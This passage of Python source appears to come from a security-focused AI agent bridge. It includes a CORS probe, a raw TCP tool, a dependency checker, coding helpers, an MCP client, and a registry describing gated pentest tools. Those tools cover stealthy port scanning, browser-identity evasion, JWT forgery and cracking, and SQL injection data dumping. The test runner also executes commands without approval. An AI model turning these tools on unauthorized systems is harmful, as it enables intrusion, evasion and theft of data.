                     "keys (Firebase/Supabase/Google) are public by design."
                     if findings else "no hardcoded secrets matched in the page or its JavaScript.")}


def tool_cors_probe(args: dict) -> dict:
    """AUTHORIZED PENTEST. Test a URL for CORS misconfiguration: sends requests
    with crafted Origin headers and checks whether the server REFLECTS the origin
    in Access-Control-Allow-Origin — especially alongside Access-Control-Allow-
    Credentials: true, the combination that lets an attacker-controlled site read
    authenticated responses. Also flags accepted 'null' origin and wildcard ACAO.
    Read-only. Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    url = _recon_prep_url((args.get("url") or args.get("target") or "").strip())
    if not url:
        return {"error": "url required"}
    timeout = max(2.0, min(float(args.get("timeout") or 8.0), 15.0))
    host = urllib.parse.urlparse(url).netloc.split(":")[0]
    rand = "".join(random.choice("abcdefghijklmnop") for _ in range(6))
    tests = [
        ("arbitrary origin", f"https://evil-{rand}.com"),
        ("null origin", "null"),
        ("target as subdomain of attacker", f"https://{host}.evil-{rand}.com"),
        ("attacker as subdomain of target", f"https://evil-{rand}.{host}"),
    ]

    def probe(origin):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={"User-Agent": _RECON_UA, "Origin": origin})
        opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        try:
            resp = opener.open(req, timeout=timeout)
            return {k.lower(): v for k, v in resp.headers.items()}
        except urllib.error.HTTPError as e:
            return {k.lower(): v for k, v in e.headers.items()}
        except Exception:
            return {}

    results = []
    for label, origin in tests:
        h = probe(origin)
        acao = h.get("access-control-allow-origin", "")
        acac = (h.get("access-control-allow-credentials", "") or "").strip().lower()
        vuln, severity, detail = False, "info", "no CORS reflection"
        if acao and acao == origin:
            vuln = True
            detail = f"server reflects the attacker Origin into Access-Control-Allow-Origin"
            severity = "high" if acac == "true" else "medium"
        elif acao == "null" and origin == "null":
            vuln = True
            detail = "server accepts the 'null' origin"
            severity = "high" if acac == "true" else "medium"
        elif acao == "*":
            detail = "wildcard ACAO (credentials not sendable; low risk unless the data is sensitive)"
            severity = "low"
        results.append({"test": label, "origin_sent": origin, "acao": acao,
                        "allow_credentials": acac or "(unset)", "vulnerable": vuln,
                        "severity": severity, "detail": detail})

    any_vuln = any(r["vulnerable"] for r in results)
    return {"url": url, "vulnerable": any_vuln, "tests": results,
            "note": ("CORS misconfiguration: an attacker-controlled page can read this endpoint's "
                     "responses — critical if it returns authenticated/sensitive data. Confirm with "
                     "a credentialed request."
                     if any_vuln else "no exploitable CORS reflection detected.")}


def tool_tcp_send(args: dict) -> dict:
    """AUTHORIZED PENTEST. Open a raw TCP connection to host:port, send data, and
    read back whatever the service returns within a read window. This is a raw
    socket, NOT a browser: it speaks bytes only, with no rendering or JS. Use it
    to talk to non-HTTP services (redis, memcached, SMTP) or to submit a URL to a
    CTF / report-to-admin bot and read the console.log output it pipes back over
    the socket. For a bot that visits a page and waits, set read_timeout high
    enough (e.g. 15). Optionally wrap in TLS. Gated behind red_team_enabled."""
    if not get_settings().get("red_team_enabled"):
        return {"error": "red team tools are disabled. Enable them in Settings."}
    host = (args.get("host") or args.get("target") or "").strip()
    port = args.get("port")
    if host and ":" in host and not port:  # accept host:port in one field
        host, _, port = host.rpartition(":")
    if not host:
        return {"error": "host required"}
    try:
        port = int(port)
    except (TypeError, ValueError):
        return {"error": "valid port required"}
    data = args.get("data")
    if data is None:
        data = args.get("payload") or ""
    send_bytes = (data if isinstance(data, str) else str(data)).encode("utf-8", "replace")
    use_tls = bool(args.get("tls"))
    connect_timeout = max(1.0, min(float(args.get("connect_timeout") or 6.0), 20.0))
    read_timeout = max(0.5, min(float(args.get("read_timeout") or 8.0), 40.0))
    max_bytes = 64 * 1024

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(connect_timeout)
    try:
        s.connect((host, port))
    except Exception as e:
        try:
            s.close()
        except Exception:
            pass
        return {"error": f"connect to {host}:{port} failed: {e}"}
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        if send_bytes:
            s.sendall(send_bytes)
        # Read until the peer closes the connection or the read window elapses
        # (a visit-and-wait bot streams its output, then closes, so this returns
        # as soon as it finishes rather than always blocking the full window).
        chunks, total = [], 0
        deadline = time.time() + read_timeout
        s.settimeout(1.0)
        while time.time() < deadline and total < max_bytes:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                continue
            except Exception:
                break
            if not chunk:
                break  # peer closed
            chunks.append(chunk)
            total += len(chunk)
        text = b"".join(chunks).decode("utf-8", "replace")
        return {"host": host, "port": port, "tls": use_tls,
                "sent_bytes": len(send_bytes), "received_bytes": total,
                "response": text[:60000],
                "note": "raw socket response (no rendering, no JS). If you submitted a URL to a "
                        "bot, any console.log it emitted is in the response above."}
    except Exception as e:
        return {"error": f"tcp exchange failed: {e}", "host": host, "port": port}
    finally:
        try:
            s.close()
        except Exception:
            pass


# --- Tool 5: check_deps ---
def tool_check_deps(args: dict) -> dict:
    """Check dependency manifests against OSV.dev vulnerabilities."""
    raw_path = args.get("path")
    if not raw_path:
        return {"error": "path required"}
        
    target = Path(normalize_path(raw_path))
    if not target.exists():
        return {"error": "path not found"}
        
    if target.is_dir():
        # Auto-detect manifest
        manifests = ["package.json", "requirements.txt", "go.mod", "Cargo.toml", "Pipfile.lock"]
        found = None
        for m in manifests:
            if (target / m).exists():
                target = target / m
                found = True
                break
        if not found:
            return {"error": f"No supported dependency manifest found in {target}"}

    manifest_name = target.name.lower()
    ecosystem = args.get("ecosystem")
    packages = []
    
    try:
        content = target.read_text(encoding="utf-8")
        
        if manifest_name == "requirements.txt" or (ecosystem and ecosystem.lower() == "pypi"):
            ecosystem = "PyPI"
            for line in content.splitlines():
                line = line.split("#")[0].strip()
                if not line: continue
                m = re.match(r"^([A-Za-z0-9_\-]+)(?:>=|==)([\w\.]+)", line)
                if m:
                    packages.append({"name": m.group(1), "version": m.group(2)})
                    
        elif manifest_name == "package.json" or (ecosystem and ecosystem.lower() == "npm"):
            ecosystem = "npm"
            data = json.loads(content)
            deps = {**data.get("dependencies", {}), **data.get("devDependencies", {})}
            for name, ver in deps.items():
                ver = re.sub(r"^[\^~>=<]+", "", ver) # strip semver modifiers
                packages.append({"name": name, "version": ver})
                
        elif manifest_name == "go.mod" or (ecosystem and ecosystem.lower() == "go"):
            ecosystem = "Go"
            in_require = False
            for line in content.splitlines():
                line = line.strip()
                if line == "require (":
                    in_require = True
                    continue
                if in_require and line == ")":
                    in_require = False
                    continue
                if in_require or line.startswith("require "):
                    m = re.search(r"([A-Za-z0-9_\-\./]+)\s+v([\w\.\-]+)", line)
                    if m:
                        packages.append({"name": m.group(1), "version": m.group(2)})
                        
        elif manifest_name == "cargo.toml" or (ecosystem and ecosystem.lower() == "crates.io"):
            ecosystem = "crates.io"
            in_deps = False
            for line in content.splitlines():
                line = line.strip()
                if line.startswith("["):
                    in_deps = "dependencies" in line
                    continue
                if in_deps and "=" in line:
                    parts = line.split("=", 1)
                    name = parts[0].strip()
                    ver_part = parts[1].strip()
                    m = re.search(r"version\s*=\s*[\"']([^\"']+)[\"']", ver_part)
                    if m:
                        packages.append({"name": name, "version": m.group(1)})
                    elif ver_part.startswith('"') or ver_part.startswith("'"):
                        packages.append({"name": name, "version": ver_part.strip("\"'")})
        else:
            return {"error": f"Unsupported manifest type: {manifest_name}"}
    except Exception as e:
        return {"error": f"Failed parsing manifest: {e}"}

    if not packages:
        return {"error": "No packages found to check"}

    # Query OSV.dev batch API
    queries = []
    for p in packages:
        queries.append({
            "version": p["version"],
            "package": {"name": p["name"], "ecosystem": ecosystem}
        })
        
    try:
        req = urllib.request.Request(
            "https://api.osv.dev/v1/querybatch",
            data=json.dumps({"queries": queries}).encode("utf-8"),
            headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read().decode("utf-8"))
    except Exception as e:
        return {"error": f"OSV.dev API request failed: {e}"}
        
    results = data.get("results", [])
    vulnerable_packages = []
    clean_packages = []
    vulnerable_count = 0
    ignored_vulns = set(args.get("ignore", []))
    
    for i, res in enumerate(results):
        pkg = packages[i]
        vulns = res.get("vulns", [])
        
        filtered_vulns = []
        for v in vulns:
            if v.get("id") not in ignored_vulns:
                filtered_vulns.append({
                    "id": v.get("id"),
                    "summary": v.get("summary", "No summary"),
                    "url": f"https://osv.dev/vulnerability/{v.get('id')}"
                })
                
        if filtered_vulns:
            vulnerable_count += 1
            vulnerable_packages.append({
                "name": pkg["name"],
                "version": pkg["version"],
                "vulns": filtered_vulns
            })
        else:
            clean_packages.append(pkg["name"])

    return {
        "path": str(target),
        "ecosystem": ecosystem,
        "manifest_type": manifest_name,
        "packages_checked": len(packages),
        "vulnerable_count": vulnerable_count,
        "packages": vulnerable_packages,
        "clean_packages": clean_packages,
        "risk_summary": f"Found {vulnerable_count} vulnerable packages out of {len(packages)} checked."
    }

# =====================================================================
# AGENTIC CODING TOOLS
# =====================================================================

def tool_read_skeleton(args: dict) -> dict:
    file_path = normalize_path(args.get("path", ""))
    if not is_in_workspace(file_path):
        return {"error": "Path is outside workspace bounds."}
    if not os.path.exists(file_path):
        return {"error": f"File not found: {file_path}"}
    
    ext = os.path.splitext(file_path)[1]
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except Exception as e:
        return {"error": f"Read error: {e}"}

    if ext == '.py':
        try:
            tree = ast.parse(content)
            skeleton = []
            for node in tree.body:
                if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                    doc = ast.get_docstring(node)
                    doc_preview = f" # {doc.splitlines()[0]}" if doc else ""
                    skeleton.append(f"def {node.name}(...):{doc_preview}")
                elif isinstance(node, ast.ClassDef):
                    doc = ast.get_docstring(node)
                    doc_preview = f" # {doc.splitlines()[0]}" if doc else ""
                    skeleton.append(f"class {node.name}:{doc_preview}")
                    for child in node.body:
                        if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef)):
                            cdoc = ast.get_docstring(child)
                            cdoc_prev = f" # {cdoc.splitlines()[0]}" if cdoc else ""
                            skeleton.append(f"    def {child.name}(...):{cdoc_prev}")
            return {"result": "\n".join(skeleton)}
        except SyntaxError as e:
            return {"error": f"AST parse failed due to SyntaxError: {e}"}
            
    elif ext in ('.js', '.ts', '.jsx', '.tsx'):
        skeleton = []
        class_re = re.compile(r'^\s*(?:export\s+)?(?:default\s+)?class\s+(\w+)')
        func_re = re.compile(r'^\s*(?:export\s+)?(?:default\s+)?(?:async\s+)?function\s+(\w+)')
        arrow_re = re.compile(r'^\s*(?:export\s+)?const\s+(\w+)\s*=\s*(?:async\s+)?(?:\([^)]*\)|[^=]+)\s*=>')
        
        for line in content.splitlines():
            if m := class_re.search(line):
                skeleton.append(f"class {m.group(1)}")
            elif m := func_re.search(line):
                skeleton.append(f"function {m.group(1)}()")
            elif m := arrow_re.search(line):
                skeleton.append(f"const {m.group(1)} = () => ...")
                
        return {"result": "\n".join(skeleton)}
    else:
        return {"error": f"Unsupported file extension: {ext}"}


# HTML void elements never take a closing tag — they must not be tracked on
# the nesting stack or we'd report every <br>/<img> as "unclosed".
_HTML_VOID_TAGS = frozenset((
    "area", "base", "br", "col", "embed", "hr", "img", "input",
    "link", "meta", "param", "source", "track", "wbr",
))
# Elements whose closing tag is OPTIONAL per the HTML spec — browsers auto-close
# them, so a missing </p> or </li> is valid, not a bug. We never flag these as
# unclosed, otherwise the model "fixes" markup that was already correct.
_HTML_OPTIONAL_CLOSE = frozenset((
    "html", "head", "body", "p", "li", "dt", "dd", "option", "optgroup",
    "thead", "tbody", "tfoot", "tr", "td", "th", "colgroup", "caption",
    "rp", "rt", "menuitem",
))


def _check_html_syntax(file_path: str) -> dict:
    """Structural sanity check for HTML using only the stdlib HTMLParser.
    HTML is lenient by design, so we deliberately report ONLY high-confidence
    breakage — unclosed <script>/<style>, explicit close tags with no matching
    open, and tags left open at EOF — while ignoring void and optional-close
    elements. This avoids false positives that would push the model into
    "fixing" valid markup."""
    from html.parser import HTMLParser

    problems: list[str] = []
    stack: list[tuple[str, int]] = []  # (tagname, lineno)

    class _Checker(HTMLParser):
        def handle_starttag(self, tag, attrs):
            if tag in _HTML_VOID_TAGS:
                return
            stack.append((tag, self.getpos()[0]))

        def handle_startendtag(self, tag, attrs):
            pass  # self-closing (<br/>) — nothing to track

        def handle_endtag(self, tag):
            if tag in _HTML_VOID_TAGS:
                return
            # Find the nearest matching open tag. Tags left dangling between it
            # and the close are implicitly closed by the browser; that's fine
            # for optional-close elements (an open <li> when </ul> arrives) but
            # a dangling non-optional element (e.g. an open <div> when </body>
            # arrives) is a real missing-close-tag bug, so we flag those.
            for i in range(len(stack) - 1, -1, -1):
                if stack[i][0] == tag:
                    for dtag, dline in stack[i + 1:]:
                        if dtag not in _HTML_OPTIONAL_CLOSE:
                            problems.append(f"line {dline}: unclosed <{dtag}> — missing </{dtag}> (implicitly closed by </{tag}>)")
                    del stack[i:]
                    return
            # No matching open tag anywhere — a real stray close tag, unless
            # it's an optional-close element the parser can safely ignore.
            if tag not in _HTML_OPTIONAL_CLOSE:
                problems.append(f"line {self.getpos()[0]}: stray </{tag}> with no matching open tag")

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            src = f.read()
    except Exception as e:
        return {"error": f"read failed: {e}"}

    parser = _Checker(convert_charrefs=True)
    try:
        parser.feed(src)
        parser.close()
    except Exception as e:
        # HTMLParser rarely raises, but malformed declarations can — surface it.
        return {"error": f"HTML parse error: {e}"}

    # Anything left open that REQUIRES closing is a genuine structural error.
    # <script>/<style> are called out by name because an unclosed one swallows
    # the rest of the document and is the most common real HTML break.
    for tag, lineno in stack:
        if tag in _HTML_OPTIONAL_CLOSE:
            continue
        if tag in ("script", "style"):
            problems.append(f"line {lineno}: unclosed <{tag}> — missing </{tag}> (this hides everything after it)")
        else:
            problems.append(f"line {lineno}: unclosed <{tag}> — missing </{tag}>")

    if problems:
        return {"error": "HTML structural errors:\n" + "\n".join(problems)}
    return {"result": "Syntax OK (HTML is lenient — structural check only: tag nesting, "
                      "unclosed script/style. Browser-tolerated quirks are not flagged.)"}


def tool_check_syntax(args: dict) -> dict:
    file_path = normalize_path(args.get("path", ""))
    if not is_in_workspace(file_path):
        return {"error": "Path is outside workspace bounds."}
    if not os.path.exists(file_path):
        return {"error": f"File not found: {file_path}"}

    ext = os.path.splitext(file_path)[1].lower()
    if ext in ('.html', '.htm', '.xhtml'):
        return _check_html_syntax(file_path)
    if ext == '.py':
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                ast.parse(f.read(), filename=file_path)
            return {"result": "Syntax OK"}
        except SyntaxError as e:
            return {"error": f"SyntaxError at line {e.lineno}, offset {e.offset}: {e.msg}\n{e.text}"}
        except Exception as e:
            return {"error": str(e)}
            
    elif ext in ('.js', '.ts', '.jsx', '.tsx'):
        try:
            res = subprocess.run(['node', '--check', file_path], capture_output=True, text=True)
            if res.returncode == 0:
                return {"result": "Syntax OK"}
            return {"error": res.stderr.strip() or "Syntax check failed"}
        except FileNotFoundError:
            return {"error": "Node.js not installed or not in PATH."}
    else:
        return {"error": f"Unsupported extension: {ext}"}


def tool_run_tests(args: dict) -> dict:
    command = args.get("command", "")
    cwd = normalize_path(args.get("cwd", str(ROOT)))
    
    if not is_in_workspace(cwd):
        return {"error": "CWD is outside workspace bounds."}
    
    # Approval gating tests might be needed if they run arbitrary scripts, but typically tests are safe.
    # We will just run them.
    try:
        res = subprocess.run(shlex.split(command), cwd=cwd, capture_output=True, text=True)
        output = res.stdout + "\n" + res.stderr
        
        failures = [
            line.strip() for line in output.splitlines() 
            if any(kw in line for kw in ("FAIL", "Error:", "Exception", "Traceback", "FAILED"))
        ]
        
        summary = {
            "passed": res.returncode == 0,
            "returncode": res.returncode,
            "failure_hints": failures[:15],
            "output_tail": output[-2000:]
        }
        
        if res.returncode == 0:
            return {"result": summary}
        return {"error": "Tests failed", "details": summary}
        
    except Exception as e:
        return {"error": str(e)}

# =====================================================================
# MCP CLIENT IMPLEMENTATION
# =====================================================================

class MCPClient:
    def __init__(self, name: str, command: str, args: list[str] = None, env: dict[str, str] = None):
        self.name = name
        self.command = command
        self.args = args or []
        self.env = env or {}
        self.process = None
        self.request_id = 0
        self.responses = {}
        self.condition = threading.Condition()
        self.running = False
        self._reader_thread = None

    def start(self):
        process_env = os.environ.copy()
        process_env.update(self.env)
        
        try:
            self.process = subprocess.Popen(
                [self.command] + self.args,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                env=process_env,
                text=True,
                bufsize=1,
                shell=(os.name == 'nt')
            )
        except Exception as e:
            return {"error": str(e)}
            
        self.running = True
        self._reader_thread = threading.Thread(target=self._read_stdout, daemon=True)
        self._reader_thread.start()

        init_response = self._send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {
                "name": "accuretta-bridge",
                "version": "1.0.0"
            }
        })
        
        self._send_notification("notifications/initialized")
        return init_response

    def _read_stdout(self):
        for line in self.process.stdout:
            if not self.running:
                break
            try:
                message = json.loads(line)
                if "id" in message and ("result" in message or "error" in message):
                    with self.condition:
                        self.responses[message["id"]] = message
                        self.condition.notify_all()
            except json.JSONDecodeError:
                pass

    def _send_request(self, method: str, params: dict = None) -> dict:
        self.request_id += 1
        req_id = self.request_id
        payload = {
            "jsonrpc": "2.0",
            "id": req_id,
            "method": method,
            "params": params or {}
        }
        
        try:
            self.process.stdin.write(json.dumps(payload) + "\n")
            self.process.stdin.flush()
        except Exception as e:
            return {"error": {"message": f"Failed to write to MCP stdin: {e}"}}

        with self.condition:
            while req_id not in self.responses and self.running and self.process.poll() is None:
                self.condition.wait(timeout=0.1)
                
            if req_id in self.responses:
                return self.responses.pop(req_id)
                
        return {"error": {"message": "Client stopped or process crashed"}}

    def _send_notification(self, method: str, params: dict = None):
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params or {}
        }
        try:
            self.process.stdin.write(json.dumps(payload) + "\n")
            self.process.stdin.flush()
        except Exception:
            pass

    def list_tools(self) -> dict:
        return self._send_request("tools/list")

    def call_tool(self, name: str, arguments: dict) -> dict:
        return self._send_request("tools/call", {
            "name": name,
            "arguments": arguments
        })

    def stop(self):
        self.running = False
        if self.process:
            self.process.terminate()
            self.process.wait()

_ACTIVE_MCP_CLIENTS = []

def _load_mcp_servers():
    config_path = ROOT / "bridge_mcp_config.json"
    if not config_path.exists():
        return

    try:
        with open(config_path, "r", encoding="utf-8") as f:
            config = json.load(f)
    except Exception as e:
        print(f"[!] Failed to parse bridge_mcp_config.json: {e}")
        return
        
    for server_name, server_config in config.get("mcpServers", {}).items():
        client = MCPClient(
            name=server_name,
            command=server_config["command"],
            args=server_config.get("args", []),
            env=server_config.get("env", {})
        )
        
        print(f"[*] Starting MCP server: {server_name}...")
        res = client.start()
        if "error" in res:
            print(f"[!] Failed to start MCP {server_name}: {res['error']}")
            continue
            
        _ACTIVE_MCP_CLIENTS.append(client)
        
        tools_response = client.list_tools()
        if "error" in tools_response:
            print(f"[!] Failed to list tools for {server_name}: {tools_response['error']}")
            continue
            
        mcp_tools = tools_response.get("result", {}).get("tools", [])
        
        for tool_def in mcp_tools:
            tool_name = tool_def["name"]
            # prefix tool name to avoid collisions
            prefixed_name = f"mcp_{server_name}_{tool_name}"
            
            def make_tool_callable(mcp_client, name, desc):
                def wrapper(args: dict):
                    # ALWAYS APPROVAL GATE MCP TOOLS
                    appr = request_approval(
                        title=f"MCP: {name}",
                        command=f"Execute {name} via {mcp_client.name}",
                        details={"Arguments": args}
                    )
                    if appr.get("decision") != "approve":
                        return {"error": "User denied action.", "reason": appr.get("reason", "")}
                        
                    response = mcp_client.call_tool(name, args)
                    if "error" in response:
                        return {"error": response['error']}
                        
                    content = response.get("result", {}).get("content", [])
                    return "\n".join(item.get("text", "") for item in content if item.get("type") == "text")
                return wrapper

            # Inject into the global TOOLS dictionary
            TOOLS[prefixed_name] = {
                "description": f"[MCP: {server_name}] {tool_def.get('description', '')}. Requires user approval.",
                "parameters": tool_def.get("inputSchema", {}),
                "fn": make_tool_callable(client, tool_name, tool_def.get('description', '')),
            }
            # Add to analysis tool names so it's registered
            _ANALYSIS_TOOL_NAMES.add(prefixed_name)
            print(f"  -> Registered MCP tool: {prefixed_name}")

TOOLS: dict[str, dict] = {

    "read_skeleton": {
        "description": "Read the skeleton (classes, functions, signatures, docstrings) of a source file.",
        "parameters": {
            "type": "object",
            "properties": {"path": {"type": "string", "description": "Path to the file."}},
            "required": ["path"],
        },
        "fn": tool_read_skeleton,
    },
    "pin_note": {
        "description": "Pin a fact, decision, or fix to THIS session so it stays in context permanently and is never trimmed. Use it the moment you fix a bug (record the root cause + the fix), make a design decision, or the user states a constraint — so you never undo it or repeat the mistake.",
        "parameters": {
            "type": "object",
            "properties": {"note": {"type": "string", "description": "The fact/fix/decision to lock in (one sentence)."}},
            "required": ["note"],
        },
        "fn": tool_pin_note,
    },
    "unpin_note": {
        "description": "Remove a pin from this session by its exact text or 1-based index (use when a pinned decision is reversed or no longer applies).",
        "parameters": {
            "type": "object",
            "properties": {
                "note": {"type": "string", "description": "Exact pin text to remove."},
                "index": {"type": "integer", "description": "1-based index of the pin to remove."}
            },
            "required": [],
        },
        "fn": tool_unpin_note,
    },
    "check_syntax": {
        "description": "Check the syntax of a Python, JS/TS, or HTML file without executing it. Returns line numbers of any errors. HTML gets a lenient structural check (tag nesting, unclosed script/style) — browser-tolerated quirks are not flagged.",
        "parameters": {
            "type": "object",
            "properties": {"path": {"type": "string", "description": "Path to the file."}},
            "required": ["path"],
        },
        "fn": tool_check_syntax,
    },
    "run_tests": {
        "description": "Run a test command (e.g. pytest, npm test) and get a structured summary of failures.",
        "parameters": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Test command to execute."},
                "cwd": {"type": "string", "description": "Directory to run tests in."}
            },
            "required": ["command"],
        },
        "fn": tool_run_tests,
    },


    "scan_secrets": {
        "description": "Scan a file or directory for hardcoded secrets (API keys, tokens, passwords). Read-only. Requires user approval.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path to file or directory."},
                "extensions": {"type": "array", "items": {"type": "string"}, "description": "Optional list of extensions to scan."},
                "max_files": {"type": "integer", "description": "Max files to scan, default 500."},
                "max_file_bytes": {"type": "integer", "description": "Max file size to scan, default 2MB."},
                "include_http_endpoints": {"type": "boolean", "description": "Include hardcoded HTTP URLs in scan, default false."}
            },
            "required": ["path"],
        },
        "fn": tool_scan_secrets,
    },
    "parse_evtx": {
        "description": "Parse Windows .evtx event log files. Requires user approval.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path to .evtx file."},
                "event_ids": {"type": "array", "items": {"type": "integer"}, "description": "Optional list of event IDs to filter."},
                "limit": {"type": "integer", "description": "Max records to return, default 500."},
                "keywords": {"type": "string", "description": "Optional keyword search."},
                "since": {"type": "string", "description": "Optional ISO timestamp filter."}
            },
            "required": ["path"],
        },
        "fn": tool_parse_evtx,
    },
    "analyze_pcap": {
        "description": "Analyze a PCAP or PCAPNG packet capture file. Requires user approval.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Path to PCAP file."},
                "max_packets": {"type": "integer", "description": "Max packets to process, default 50000."},
                "dns_only": {"type": "boolean", "description": "Only extract DNS queries."},
                "http_only": {"type": "boolean", "description": "Only extract HTTP requests."}
            },
            "required": ["path"],
        },
        "fn": tool_analyze_pcap,
    },
    "audit_http_headers": {
        "description": "Fetch a URL and grade its HTTP security headers. No approval needed.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL to audit."},
                "follow_redirects": {"type": "boolean", "description": "Follow HTTP redirects, default true."}
            },
            "required": ["url"],
        },
        "fn": tool_audit_http_headers,
    },
    "recon_port_scan": {
        "description": "AUTHORIZED RECON ONLY. Stealthy TCP-connect port scan (capped concurrency, randomized order, jitter — quieter than nmap). Read-only. Use only against targets you are authorized to test.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Target hostname or IP."},
                "ports": {"type": "array", "items": {"type": "integer"}, "description": "Optional explicit port list. Default = ~50 common ports."},
                "timeout": {"type": "number", "description": "Per-port connect timeout seconds (default 1.5)."},
                "concurrency": {"type": "integer", "description": "Max simultaneous probes (default 8, max 32). Lower = stealthier."},
                "jitter_ms": {"type": "integer", "description": "Random delay before each probe in ms (default 40)."}
            },
            "required": ["host"],
        },
        "fn": tool_recon_port_scan,
    },
    "recon_tls_audit": {
        "description": "AUTHORIZED RECON ONLY. Inspect a host's TLS: protocol, cipher, certificate subject/issuer/SANs/expiry, validation status. Flags weak protocols and expired/self-signed certs. Read-only.",
        "parameters": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Target hostname."},
                "port": {"type": "integer", "description": "TLS port (default 443)."}
            },
            "required": ["host"],
        },
        "fn": tool_recon_tls_audit,
    },
    "recon_http_fingerprint": {
        "description": "AUTHORIZED RECON ONLY. Fetch a URL and fingerprint the server: status, redirect chain, Server/X-Powered-By, page title, notable headers, cookies. Read-only.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL (scheme optional; defaults to https)."}
            },
            "required": ["url"],
        },
        "fn": tool_recon_http_fingerprint,
    },
    "http_request": {
        "description": "AUTHORIZED PENTEST. Send an arbitrary HTTP request (method, url, headers, cookies, body) and get back status, ALL response headers (every Set-Cookie preserved in 'set_cookie'), and body — the curl/Burp Repeater primitive for actually exploiting a finding: read a Set-Cookie then flip+replay it, aim an SSRF url param, POST an SSTI/injection payload. Wears a rotating real-browser identity (blends in). Every status is returned (a 403/500 body is signal, not an error). host:port and http:// targets are fine. Pass save_evidence to persist the exploit request+response as a proof artifact; pass session to carry cookies across calls.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL. Scheme optional (defaults to http://). host:port is fine."},
                "method": {"type": "string", "description": "GET, POST, PUT, DELETE, etc. Defaults to POST if a body is given, else GET."},
                "headers": {"type": "object", "description": "Optional request headers as a name->value map."},
                "cookies": {"type": "object", "description": "Optional cookies as a name->value map (folded into a Cookie header)."},
                "body": {"type": "string", "description": "Optional raw request body (e.g. form-encoded 'a=1&b=2' or JSON)."},
                "session": {"type": "string", "description": "Optional session name. Reuses cookies captured under this name and remembers new Set-Cookies — for multi-step auth flows."},
                "save_evidence": {"type": "string", "description": "Optional label. Persists this exact request+response to recon_evidence/ (returns evidence_saved path + evidence_sha256) — verifiable proof of a breach."},
            },
            "required": ["url"],
        },
        "fn": tool_http_request,
    },
    "encode_decode": {
        "description": "AUTHORIZED PENTEST. Encode/decode a string (base64, base64url, url, hex, or jwt) — the Burp Decoder equivalent. Use it to inspect and FORGE tokens (decode an unsigned session cookie, flip a field like role=admin, re-encode it) instead of doing base64 by hand. base64 encode returns BOTH standard and url-safe forms.",
        "parameters": {
            "type": "object",
            "properties": {
                "text": {"type": "string", "description": "The string to transform (e.g. a cookie value or a JSON payload)."},
                "scheme": {"type": "string", "description": "base64 | base64url | url | hex | jwt. Default base64."},
                "operation": {"type": "string", "description": "encode | decode. Default encode. (jwt is always decode.)"},
            },
            "required": ["text"],
        },
        "fn": tool_encode_decode,
    },
    "jwt_tool": {
        "description": "AUTHORIZED PENTEST. Decode, forge (sign), or crack a JSON Web Token. operation=decode inspects header+payload; operation=sign builds a signed token from a JSON payload + secret + alg (HS256/384/512 or 'none' for the alg-confusion downgrade); operation=crack brute-forces the HMAC secret against a built-in weak list + your wordlist. The core of modern auth attacks (alg:none, weak-secret forgery, claim tampering).",
        "parameters": {
            "type": "object",
            "properties": {
                "operation": {"type": "string", "description": "decode | sign | crack. Default decode."},
                "token": {"type": "string", "description": "The JWT (for decode/crack)."},
                "payload": {"type": "object", "description": "Claims to sign (for operation=sign), e.g. {\"user\":\"admin\",\"role\":\"admin\"}."},
                "secret": {"type": "string", "description": "HMAC secret (for sign; omit for alg=none)."},
                "alg": {"type": "string", "description": "HS256 | HS384 | HS512 | none. Default HS256."},
                "wordlist": {"type": "array", "items": {"type": "string"}, "description": "Extra candidate secrets to try (for crack)."},
            },
            "required": [],
        },
        "fn": tool_jwt_tool,
    },
    "sql_injection": {
        "description": "AUTHORIZED PENTEST. Semi-automated SQL injection on a GET query parameter (sqlmap-lite): detects error/boolean injectability, auto-finds the UNION column count, and — with `extract` (a SELECT list like 'flag FROM secrets' or 'name FROM sqlite_master') — builds the padded UNION payload and dumps the rows. Handles the mechanical UNION assembly so you only decide WHAT to pull.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL including the target query param, e.g. http://host/search?q=test"},
                "param": {"type": "string", "description": "Which query param to inject (default: the first)."},
                "extract": {"type": "string", "description": "SELECT list to dump, optionally with FROM, e.g. 'flag FROM secrets'. Omit to just detect + count columns."},
            },
            "required": ["url"],
        },
        "fn": tool_sql_injection,
    },
    "fuzz": {
        "description": "AUTHORIZED PENTEST. Iterate a request parameter over many values and report which responses DIFFER from the norm — the primitive for enumeration/IDOR (find the object id that leaks), id/endpoint brute forcing, access checks. Put FUZZ in the url or pass `param`; give `values` (list) or `range`=[start,end]. Returns the outliers so the interesting one is obvious.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL, with FUZZ where the value goes (e.g. http://host/api/account?id=FUZZ)."},
                "param": {"type": "string", "description": "Param to vary if not using a FUZZ marker."},
